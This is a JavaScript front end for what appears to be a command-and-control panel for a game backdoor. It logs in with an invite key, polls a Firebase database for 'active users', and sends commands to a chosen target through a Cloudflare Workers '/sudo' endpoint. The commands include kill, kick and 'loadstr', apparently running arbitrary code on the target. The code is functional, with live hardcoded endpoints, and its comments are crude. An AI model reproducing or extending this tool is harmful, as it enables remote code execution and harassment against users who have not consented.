(() => {
    const loginPage = document.querySelector('.loginPage');
    const mainPage = document.querySelector('.mainPage');
    const stringIsNullOrBlank = (str) => { 
        return (!str || str.trim() === "");
    };
    let currentUser = null;
    let cachedActiveUsers = new Set();
    let lastInvKey = null;

    function listActiveUsers() {
        fetch('https://opbgguiserver-739df-default-rtdb.firebaseio.com/main.json')
            .then(res => res.json())
            .then(data => {
                const now = Date.now() / 1000;
                const dropdown = document.getElementById("activeUsersDropdown");
                const lastSelected = sessionStorage.getItem("lastSelectedUser");

                const currentActiveUsers = new Set();
                for (const user in data) {
                    const ping = data[user]?.ping;
                    if (typeof ping === "number" && now - ping <= 5) {
                        currentActiveUsers.add(user);
                    }
                }

                const usersChanged = cachedActiveUsers.size !== currentActiveUsers.size ||
                    [...cachedActiveUsers].some(u => !currentActiveUsers.has(u)) ||
                    [...currentActiveUsers].some(u => !cachedActiveUsers.has(u));

                if (usersChanged) {
                    cachedActiveUsers = currentActiveUsers;
                    dropdown.innerHTML = "";

                    if (currentActiveUsers.size === 0) {
                        const option = document.createElement("option");
                        option.disabled = true;
                        option.textContent = "No active users";
                        dropdown.appendChild(option);
                        sessionStorage.removeItem("lastSelectedUser");
                        return;
                    }

                    let foundSelection = false;
                    const sortedUsers = [...currentActiveUsers].sort();

                    for (const user of sortedUsers) {
                        const option = document.createElement("option");
                        option.value = user;
                        option.textContent = user;

                        if (user === lastSelected) {
                            option.selected = true;
                            foundSelection = true;
                        }

                        dropdown.appendChild(option);
                    }

                    if (!foundSelection) {
                        sessionStorage.removeItem("lastSelectedUser");
                    }
                }
            })
            .catch(err => console.error("Error fetching active users:", err));
    }

    function sendCommand(user, command, message) {
        if (stringIsNullOrBlank(user)) { 
            console.warn("Yo dumbass, user string is empty or blank, not sending command.");
            return;
        }
        if (stringIsNullOrBlank(command)) {
            console.warn("Command is empty or blank, you can't send nothing.");
            return;
        }

        const url = 'https://opbgguipost.landyvilla3-99d.workers.dev/sudo';
        // use stored inviteKey, if missing fallback to idk (yeah, dumb fallback)
        const payload = {
            inviteKey: lastInvKey || "idk",
            username: encodeURIComponent(user),
            command,
            message
        };
        fetch(url, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(err => console.error("Command send failed, you dun goofed:", err));
    }

    function login(inviteKey) {
        if (stringIsNullOrBlank(inviteKey)) {
            alert("Invite key can't be empty, you dumbass.");
            return;
        }
        lastInvKey = inviteKey;
        localStorage.setItem("lastInvKey", inviteKey);
        fetch(`https://opbgguipost.landyvilla3-99d.workers.dev/login?inviteKey=${inviteKey}`)
            .then(response => response.json())
            .then(data => {
                if (typeof data === 'string' && data.length > 0) {
                    currentUser = data;
                    loginPage.style.display = 'none';
                    mainPage.style.display = 'block';
                    mainPage.querySelector('h2').textContent = `Welcome, ${data}!`;
                } else {
                    alert("Invalid invite key, try again dumbass.");
                }
            })
            .catch(err => alert("Fetch failed, you probably have no internet or the server is down: " + err));
    }

    document.getElementById("loginButton").addEventListener('click', () => {
        let inviteKey = document.getElementById("inviteKey").value;
        login(inviteKey);
    });

    document.getElementById("fastLoginButton").addEventListener('click', () => {
        let inviteKey = localStorage.getItem("lastInvKey") || "";
        login(inviteKey);
    });

    [
        { id: "killButton", cmd: "kill" },
        { id: "kickButton", cmd: "kick" },
        { id: "coolkiddButton", cmd: "coolkidd" },
        { id: "idiotButton", cmd: "idiot" },
        { id: "chatButton", cmd: "chat" },
        { id: "ldstrButton", cmd: "loadstr" },
        { id: "backroomsButton", cmd: "backrooms" },
        { id: "brazilButton", cmd: "brazil" }
    ].forEach(({ id, cmd }) => {
        const btn = document.getElementById(id);
        if (btn) {
            btn.addEventListener('click', () => {
                const user = document.getElementById("activeUsersDropdown").value;
                const message = document.getElementById("messageInput").value;
                sendCommand(user, cmd, message);
            });
        }
    });

    document.getElementById("activeUsersDropdown").addEventListener("change", e => {
        sessionStorage.setItem("lastSelectedUser", e.target.value);
    });

    setInterval(listActiveUsers, 2000);
})();
